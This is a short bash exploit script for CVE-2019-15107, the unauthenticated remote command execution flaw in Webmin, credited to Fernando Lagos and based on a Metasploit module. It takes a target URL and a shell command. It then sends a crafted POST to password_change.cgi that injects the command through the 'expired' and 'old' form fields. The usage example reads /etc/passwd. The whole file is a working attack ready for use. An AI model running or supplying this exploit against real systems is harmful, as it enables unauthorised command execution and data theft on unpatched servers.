#!/bin/bash
#
# CVE-2019-15107 Webmin Unauhenticated Remote Command Execution
# based on Metasploit module https://www.exploit-db.com/exploits/47230
# Original advisory: https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
# Alternative advisory (spanish): https://blog.nivel4.com/noticias/vulnerabilidad-de-ejecucion-de-comandos-remotos-en-webmin
#
# Fernando A. Lagos B. (Zerial)
# https://blog.zerial.org
# https://blog.nivel4.com

usage() {
    >&2 cat<<HERE
$0 url cmd

e.g. $0 https://localhost:10000 "cat /etc/passwd"
HERE
    exit 1
}

[[ "$#" -ne 2 ]] &&
    usage

url="$1"
cmd="$2"

curl -XPOST -s -k "${url}/password_change.cgi" \
    -H "Cookie: redirect=1; testing=1; sessiontest=1; sid=x" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: ${url}/session_login.cgi" \
    -d "user=root&pam=1&expired=${cmd}&old=whatever|${cmd}&new1=foobar&new2=foobar"
